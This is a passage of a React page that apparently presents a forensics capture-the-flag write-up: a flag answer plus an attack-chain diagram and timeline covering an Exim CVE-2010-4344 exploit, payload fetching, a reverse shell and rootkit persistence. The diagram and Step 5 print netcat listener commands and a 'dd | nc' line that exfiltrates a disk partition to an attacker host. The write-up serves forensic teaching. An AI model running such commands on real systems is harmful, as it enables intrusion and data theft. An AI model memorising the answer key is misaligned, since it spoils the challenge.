                    <span className="text-[10px] font-mono uppercase tracking-wider text-emerald-400 block font-bold">
                      Verified Flag / Answer:
                    </span>
                    <span className="font-mono text-base font-bold text-white tracking-wide break-all">
                      45295
                    </span>
                  </div>
                  <CopyButton text={"45295"} />
                </div>
              </section>

              {/* Section 04: End-to-End Attack Lifecycle & Kill Chain */}
              <div id="timeline-map" className="scroll-mt-24 p-6 sm:p-8 rounded-3xl bg-[#0a0a0f]/90 border border-zinc-800/80 shadow-2xl space-y-6">
                <div className="border-b border-zinc-800/80 pb-4">
                  <span className="bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 font-mono text-xs px-2.5 py-0.5 rounded font-bold uppercase">
                    Incident Summary
                  </span>
                  <h2 className="text-xl sm:text-2xl font-bold text-white font-[family-name:var(--font-silkscreen)] tracking-wide mt-2">
                    End-to-End Attack Lifecycle & Kill Chain
                  </h2>
                  <p className="text-zinc-400 text-sm font-sans mt-1">
                    Connecting every question (Q1 to Q11) along the MITRE ATT&amp;CK and Cyber Kill Chain lifecycle.
                  </p>
                </div>

                <div className="rounded-xl overflow-hidden border border-zinc-800 bg-[#0d0d12]">
                  <div className="px-4 py-2 border-b border-zinc-800 bg-zinc-900/60 flex items-center justify-between text-xs font-mono">
                    <span className="text-zinc-400 font-bold uppercase tracking-wider text-[11px]">
                      Network & Attack Architecture
                    </span>
                  </div>
                  <pre className="p-4 font-mono text-xs text-zinc-300 bg-black/50 overflow-x-auto leading-relaxed">
<code>{"+---------------------------------------------------------+\n|               ATTACKER MACHINE 1 (attacks)              |\n|                     192.168.56.101                      |\n+--------------+----------------------------+-------------+\n               |                            |\n   [1] SSH Brute Force (port 22)   [2] Malicious SMTP mail (port 25)\n   user 'ulysses' (32 failures)        CVE-2010-4344 RCE exploit\n               |                            |\n               v                            v\n+---------------------------------------------------------+\n|              COMPROMISED TARGET SERVER                  |\n|                    192.168.56.102                       |\n|              (OS: Debian GNU/Linux 5.0)                 |\n|                                                         |\n|  - Exploited service:  exim4 (daemon)                   |\n|  - Payloads in /tmp:   c.pl (privesc) + rk.tar (rootkit)|\n|  - Trojan binaries:    ps, top, w (hide processes)      |\n|  - Firewall block:     iptables DROP port 45295         |\n|  - Exfil tool:         nc (PID 2169)                    |\n+--------------+----------------------------+-------------+\n               |                            |\n   [3] Reverse shell (TCP 4444)    [4] Bulk data exfil (TCP 8888)\n       interactive root access         disk (/dev/sda1) + RAM dump\n               |                            |\n               v                            v\n+---------------------------------------------------------+\n|            ATTACKER MACHINE 2 (staging + C2)            |\n|                      192.168.56.1                       |\n|                                                         |\n|  - HTTP server:   hosted 'c.pl' and 'rk.tar'            |\n|  - TCP 4444:      nc -lvnp 4444 (reverse shell)         |\n|  - TCP 8888:      nc -lvnp 8888 (exfil receiver)        |\n+---------------------------------------------------------+"}</code>
                  </pre>
                </div>

                {/* Attack Timeline Cards */}
                <div className="space-y-3 font-mono text-xs">
                  <div className="p-4 rounded-xl bg-zinc-900/60 border border-zinc-800 space-y-1">
                    <div className="flex items-center justify-between text-emerald-400 font-bold">
                      <span>Step 1: Recon &amp; SSH Brute Force</span>
                      <span>[Q1, Q2, Q3, Q4]</span>
                    </div>
                    <p className="text-zinc-400 font-sans">Attacker at <code>192.168.56.1</code> launches 32 failed login attempts against user <code>ulysses</code> on victim host <code>192.168.56.102</code> (Debian GNU/Linux 5.0). The brute force fails, serving as noise.</p>
                  </div>

                  <div className="p-4 rounded-xl bg-zinc-900/60 border border-zinc-800 space-y-1">
                    <div className="flex items-center justify-between text-red-400 font-bold">
                      <span>Step 2: Service Exploitation (CVE-2010-4344)</span>
                      <span>[Q5, Q7, Q8]</span>
                    </div>
                    <p className="text-zinc-400 font-sans">Attacker at <code>192.168.56.101</code> fires an oversized string-expansion buffer overflow against Exim 4.69 on SMTP port 25, achieving Remote Code Execution.</p>
                  </div>

                  <div className="p-4 rounded-xl bg-zinc-900/60 border border-zinc-800 space-y-1">
                    <div className="flex items-center justify-between text-amber-400 font-bold">
                      <span>Step 3: Payload Drop &amp; Reverse Shell</span>
                      <span>[Q5, Q9]</span>
                    </div>
                    <p className="text-zinc-400 font-sans">The exploit triggers <code>wget</code> to fetch <code>c.pl</code> and <code>rk.tar</code> from <code>192.168.56.1</code>, executing a Perl privilege escalation script and opening an interactive root reverse shell on port 4444.</p>
                  </div>

                  <div className="p-4 rounded-xl bg-zinc-900/60 border border-zinc-800 space-y-1">
                    <div className="flex items-center justify-between text-purple-400 font-bold">
                      <span>Step 4: Persistence &amp; Rival Rootkit Cleanup</span>
                      <span>[Q9, Q11]</span>
                    </div>
                    <p className="text-zinc-400 font-sans">The attacker unpacks <code>rk.tar</code>, installs a backdoor service, trojans <code>ps/top/w</code> to hide processes, and drops outbound traffic to port <code>45295</code> to kill rival SHV4/SHV5 rootkits.</p>
                  </div>

                  <div className="p-4 rounded-xl bg-zinc-900/60 border border-zinc-800 space-y-1">
                    <div className="flex items-center justify-between text-cyan-400 font-bold">
                      <span>Step 5: Mass Data Exfiltration</span>
                      <span>[Q6, Q10]</span>
                    </div>
                    <p className="text-zinc-400 font-sans">The attacker executes <code>dd if=/dev/sda1 | nc 192.168.56.1 8888</code> (PID <code>2169</code>) to exfiltrate the raw partition and memory dump across the network to port <code>8888</code>.</p>
                  </div>
                </div>
              </div>

            </div>
          </div>
        </div>
      </main>
    </div>
  );
}